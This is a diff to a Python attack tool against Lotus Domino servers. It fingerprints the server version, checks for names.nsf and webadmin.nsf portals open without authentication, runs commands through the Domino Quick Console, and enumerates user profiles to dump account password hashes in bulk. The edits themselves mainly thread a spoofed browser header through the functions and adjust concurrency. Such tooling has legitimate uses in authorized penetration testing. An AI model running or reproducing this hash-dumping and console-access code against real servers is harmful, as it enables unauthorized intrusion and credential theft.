@@ -55,7 +55,6 @@ class Interactive(cmd.Cmd):
 			'Accept': '*/*',
 			'Accept-Language': 'en-US,en;q=0.5',
 			'Accept-Encoding': 'gzip, deflate',
-			'DNT': '1',
 			'Referer': "{0}/webadmin.nsf/pgBookmarks?OpenPage".format(url),
 			'Connection': 'keep-alive'
 		}
@@ -97,7 +96,7 @@ class Interactive(cmd.Cmd):
 	help_exit = help_quit = help_EOF
 
 # Get Domino version
-def fingerprint(url):
+def fingerprint(url, header):
 	version_files = ['download/filesets/l_LOTUS_SCRIPT.inf', 
 			'download/filesets/n_LOTUS_SCRIPT.inf',
 			'download/filesets/l_SEARCH.inf',
@@ -106,7 +105,8 @@ def fingerprint(url):
 
 	for version_file in version_files:
 		try:
-			request = requests.get("{0}/{1}".format(url, version_file), verify=False)
+			version_url = "{0}/{1}".format(url, version_file)
+			request = requests.get(version_url, headers=header, verify=False)
 			if request.status_code == 200:
 				domino_version = re.search("(?i)version=([0-9].[0-9].[0-9])", request.text)
 				if domino_version:
@@ -119,11 +119,12 @@ def fingerprint(url):
 	return None
 
 # Check for open authentication to names.nsf and webadmin.nsf
-def check_portals(url):
+def check_portals(url, header):
 	portals = ['names.nsf', 'webadmin.nsf']
 	for portal in portals:
 		try:
-			request = requests.get("{0}/{1}".format(url, portal), verify=False)
+			portal_url = "{0}/{1}".format(url, portal)
+			request = requests.get(portal_url, headers=header, verify=False)
 			if request.status_code == 200:
 				print_good("{0}/{1} does NOT require authentication!".format(url, portal))
 			elif request.status_code == 401:
@@ -138,12 +139,10 @@ def check_access(url, username, password, version):
 	session = requests.Session()
 	session.auth = (username, password)
 
-	header = {
-		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
+	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
 		'Accept': '*/*',
 		'Accept-Language': 'en-US,en;q=0.5',
 		'Accept-Encoding': 'gzip, deflate',
-		'DNT': '1',
 		'Referer': "{0}/webadmin.nsf/pgBookmarks?OpenPage".format(url),
 		'Connection': 'keep-alive'
 	}
@@ -178,7 +177,7 @@ def check_access(url, username, password, version):
 	return None, None
 
 # Get user profile URLs
-def enum_accounts(url, username, password):
+def enum_accounts(url, header, username, password):
 	accounts = []
 	session = requests.Session()
 	session.auth = (username, password)
@@ -186,7 +185,7 @@ def enum_accounts(url, username, password):
 	for page in range(1, 100000, 30):
 		try:
 			pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}".format(url, page)
-			request = session.get(pages, timeout=(60), verify=False)
+			request = session.get(pages, headers=header, timeout=(60), verify=False)
 			if request.status_code == 200:
 				soup = BeautifulSoup(request.text, 'lxml')
 				empty_page = soup.findAll('h2')
@@ -207,31 +206,32 @@ def enum_accounts(url, username, password):
 			print_error('Could not connect to Domino server!')
 			break
 
-	async_requests(accounts, url, username, password)
+	async_requests(accounts, url, header, username, password)
 
 # Asynchronously get hashes
-def async_requests(accounts, url, username, password):
-	NUM_SESSIONS = 50
+def async_requests(accounts, url, header, username, password):
+	NUM_SESSIONS = 20
 	sessions = [requests.Session() for i in range(NUM_SESSIONS)]
 	async_list = []
 	i = 0
 
-	try:
-		for unid in accounts:
+	for unid in accounts:
+		try:
 			profile = "{0}/names.nsf/{1}?OpenDocument".format(url, unid)
 			action_item = grequests.get(profile,
 				hooks={'response':get_domino_hash},
 				session=sessions[i % NUM_SESSIONS],
 				auth=(username, password),
+				headers=header,
 				verify=False
 			)
 			async_list.append(action_item)
 			i += 1
 
-		grequests.map(async_list, size=NUM_SESSIONS * 5)
+		except KeyboardInterrupt:
+			break
 
-	except KeyboardInterrupt:
-		pass
+	grequests.map(async_list, size=NUM_SESSIONS * 5)
 
 # Dump Domino hashes
 def get_domino_hash(response, **kwargs):
@@ -257,7 +257,7 @@ def get_domino_hash(response, **kwargs):
 				# Lotus Notes/Domino 5 Format
 				if len(domino_hash) > 22:
 					domino_hash = domino_hash.strip('()')
-				break
+					break
 			else:
 				continue
 	except:
@@ -311,6 +311,13 @@ if __name__ == '__main__':
 	username = args.username
 	password = ' '.join(args.password)
 
+	HEADER = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
+		'Accept': '*/*',
+		'Accept-Language': 'en-US,en;q=0.5',
+		'Accept-Encoding': 'gzip, deflate',
+		'Connection': 'keep-alive'
+	}
+
 	# Process Domino URL
 	if args.url:
 		url = re.search("((https?)://([a-zA-Z0-9.-]+))", args.url)
@@ -326,7 +333,7 @@ if __name__ == '__main__':
 	# Interact with quick console
 	if args.quickconsole:
 		print_status('Accessing Domino Quick Console...')
-		version = fingerprint(target)
+		version = fingerprint(target, HEADER)
 		who_am_i, local_path = check_access(target, username, password, version)
 		if who_am_i:
 			print_good("Running as {0}".format(who_am_i))
@@ -338,11 +345,11 @@ if __name__ == '__main__':
 	# Dump hashes
 	elif args.hashdump:
 		print_status('Dumping Domino account hashes...')
-		enum_accounts(target, username, password)
+		enum_accounts(target, HEADER, username, password)
 
 	# Fingerprint
 	else:
 		print_status('Fingerprinting Domino server...')
-		version = fingerprint(target)
+		version = fingerprint(target, HEADER)
 		print_good("Domino version: {0}".format(version))
-		check_portals(target)
+		check_portals(target, HEADER)
